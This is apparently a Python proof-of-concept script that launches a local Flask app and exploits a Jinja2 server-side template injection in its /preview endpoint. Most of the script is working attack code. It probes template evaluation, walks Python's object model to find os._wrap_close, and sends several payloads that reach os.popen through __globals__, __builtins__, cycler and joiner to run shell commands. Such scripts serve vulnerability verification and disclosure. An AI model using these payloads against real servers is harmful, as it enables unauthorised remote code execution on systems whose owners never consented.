#!/usr/bin/env python3
"""
POC for Server-Side Template Injection (SSTI) in GET /preview

VULNERABILITY: The /preview endpoint passes user-supplied 'tpl' query parameter
directly to jinja2.Template().render() with no validation or sandboxing.
This allows arbitrary Jinja2 template expressions leading to RCE.

CALL CHAIN:
  GET /preview?tpl={{payload}}
  -> app.py:31-33 preview() 
  -> handlers/template.py:4-8 preview_template(request)
  -> services/render_service.py:4-5 Template(user_template).render(**context)

DEPENDENCIES: pip install requests
"""

import subprocess
import sys
import time
import urllib.parse
import os
import signal
import re

try:
    import requests
except ImportError:
    print("[ERROR] 'requests' required. Run: pip install requests")
    sys.exit(1)

BASE_URL = "http://127.0.0.1:5555"
HEADERS = {"User-Agent": "SSTI-POC/1.0"}


def start_server():
    """Start Flask server in background."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    env = os.environ.copy()
    env["FLASK_RUN_PORT"] = "5555"
    
    proc = subprocess.Popen(
        [sys.executable, "-c", 
         "from app import app; app.run(port=5555, debug=False)"],
        cwd=script_dir,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=env,
        preexec_fn=os.setsid
    )
    
    for _ in range(25):
        try:
            r = requests.get(f"{BASE_URL}/preview", headers=HEADERS, timeout=0.5)
            if r.status_code in (200, 400):
                return proc
        except:
            pass
        time.sleep(0.2)
    
    proc.kill()
    return None


def stop_server(proc):
    """Kill server process group."""
    if proc:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            proc.wait(timeout=2)
        except:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except:
                pass


def send_payload(payload):
    """Send payload and return (status_code, preview_text)."""
    try:
        r = requests.get(
            f"{BASE_URL}/preview", 
            params={"tpl": payload}, 
            headers=HEADERS,
            timeout=10
        )
        try:
            return r.status_code, r.json().get("preview", "")
        except:
            return r.status_code, r.text
    except Exception as e:
        return None, str(e)


def find_os_wrap_close_index():
    """Enumerate subclasses and find os._wrap_close index."""
    status, subclasses = send_payload("{{''.__class__.__mro__[1].__subclasses__()}}")
    if status != 200:
        return None
    
    matches = re.findall(r"<class '([^']+)'>", subclasses)
    for i, cls in enumerate(matches):
        if cls == "os._wrap_close":
            return i
    return None


def test_rce_payloads(os_idx):
    """Try multiple RCE payload variations."""
    # === 输入验证 ===
    if not isinstance(os_idx, int) or os_idx < 0 or os_idx > 10000:
        print(f"    [ERROR] Invalid os_idx value: {os_idx!r}. Must be a non-negative integer in range [0, 10000].")
        return False, None, None
    # === 验证结束 ===
    
    payloads = [
        # Method 1: Direct os.popen via __globals__['os']
        (f"{{{{''.__class__.__mro__[1].__subclasses__()[{os_idx}].__init__.__globals__['os'].popen('id').read()}}}}",
         "direct os key"),
        
        # Method 2: Using .get() to access os
        (f"{{{{''.__class__.__mro__[1].__subclasses__()[{os_idx}].__init__.__globals__.get('os').popen('id').read()}}}}",
         "get() method"),
        
        # Method 3: Access __builtins__ then __import__
        ("{{''.__class__.__mro__[1].__subclasses__()[" + str(os_idx) + "].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
         "via __builtins__"),
        
        # Method 4: Using builtins dict
        ("{{''.__class__.__mro__[1].__subclasses__()[" + str(os_idx) + "].__init__.__globals__['__builtins__'].get('__import__')('os').popen('id').read()}}",
         "via __builtins__.get()"),
    ]
    
    for payload, desc in payloads:
        status, result = send_payload(payload)
        if "uid=" in result or "gid=" in result:
            return True, desc, result
        if status == 200 and result and "500" not in result and "Error" not in result:
            # Might have succeeded but output is different
            if len(result) > 0 and "<!doctype" not in result.lower():
                return True, desc, result
    
    return False, None, None


def main():
    print("=" * 60)
    print("SSTI POC - GET /preview (CWE-94 Code Injection)")
    print("=" * 60)
    
    print("\n[*] Starting vulnerable Flask server on port 5555...")
    server = start_server()
    if not server:
        print("[ERROR] Server failed to start")
        print("\n[NOT VULNERABLE] Unable to test - server not available")
        return 1
    
    print(f"[+] Server running on {BASE_URL}")
    
    rce_confirmed = False
    ssti_confirmed = False
    introspection_confirmed = False
    rce_result = None
    
    try:
        # Test 1: Basic SSTI (math)
        print("\n[TEST 1] Basic SSTI - Math Expression")
        status, result = send_payload("{{7*7}}")
        if status == 200 and "49" in result:
            print(f"    Payload: {{{{7*7}}}}")
            print(f"    Result: {result}")
            print("    [PASS] Template expressions are evaluated!")
            ssti_confirmed = True
        else:
            print(f"    [FAIL] Status={status}, Result={result[:100] if result else 'empty'}")
        
        # Test 2: Object introspection
        print("\n[TEST 2] Object Introspection")
        status, result = send_payload("{{''.__class__.__mro__}}")
        if status == 200 and "class" in result.lower():
            print(f"    Payload: {{{{''.__class__.__mro__}}}}")
            print(f"    Result: {result[:100]}...")
            print("    [PASS] Can traverse Python object model")
            introspection_confirmed = True
        else:
            print(f"    [FAIL] Status={status}")
        
        # Test 3: Find exploitable class
        print("\n[TEST 3] Subclass Enumeration")
        os_idx = find_os_wrap_close_index()
        if os_idx is not None:
            print(f"    [+] Found os._wrap_close at index {os_idx}")
            
            # Test 4: RCE attempts
            print("\n[TEST 4] Remote Code Execution Attempts")
            rce_confirmed, method, rce_result = test_rce_payloads(os_idx)
            
            # === 防御性处理：test_rce_payloads 因参数校验失败返回 ===
            if not rce_confirmed and method is None and rce_result is None:
                print("    [!] RCE test skipped: os_idx parameter validation failed")
            else:
                if rce_confirmed:
                    print(f"    [+] SUCCESS via {method}")
                    print(f"    Result: {rce_result}")
                    print("    [PASS] REMOTE CODE EXECUTION CONFIRMED!")
                else:
                    # Try simpler verification - just show we can access globals
                    print("    [*] Trying alternative verification...")
                    
                    # Access __builtins__ to show we can reach Python internals
                    builtin_payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{os_idx}].__init__.__globals__.keys()}}}}"
                    status, result = send_payload(builtin_payload)
                    if status == 200 and "os" in result:
                        print(f"    [+] Can access __globals__ keys: contains 'os'")
                        print(f"    [+] Result: {result[:150]}...")
                        
                        # Try a simpler approach - use cycler or other Jinja2 objects
                        # Access via Jinja2's built-in objects
                        print("\n    [*] Trying Jinja2 native RCE...")
                        jinja_payload = "{{cycler.__init__.__globals__.os.popen('id').read()}}"
                        status, result = send_payload(jinja_payload)
                        if "uid=" in result:
                            print(f"    [+] SUCCESS via Jinja2 cycler")
                            print(f"    Result: {result}")
                            rce_confirmed = True
                        else:
                            print(f"    [-] Jinja2 cycler: {result[:100] if result else 'empty'}")
                            
                            # Try joiner
                            jinja_payload2 = "{{joiner.__init__.__globals__.os.popen('id').read()}}"
                            status, result = send_payload(jinja_payload2)
                            if "uid=" in result:
                                print(f"    [+] SUCCESS via Jinja2 joiner")
                                print(f"    Result: {result}")
                                rce_confirmed = True
        else:
            print("    [!] Could not find os._wrap_close class")
        
        # Summary
        print("\n" + "=" * 60)
        print("SUMMARY")
        print("=" * 60)
        
        if rce_confirmed:
            print("\n[VULNERABLE] Server-Side Template Injection with RCE")
            print("    Impact: Remote code execution")
            print("    Cause: User input passed to jinja2.Template() without sanitization")
            print("    Endpoint: GET /preview?tpl={{payload}}")
        elif ssti_confirmed and introspection_confirmed:
            print("\n[VULNERABLE] Server-Side Template Injection confirmed")
            print("    Impact: Code execution likely possible (RCE payload may need adjustment)")
            print("    Cause: User input passed to jinja2.Template() without sanitization")
            print("    Evidence: Template expressions evaluated, object traversal works")
        else:
            print("\n[NOT VULNERABLE] Could not confirm SSTI vulnerability")
    
    finally:
        stop_server(server)
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
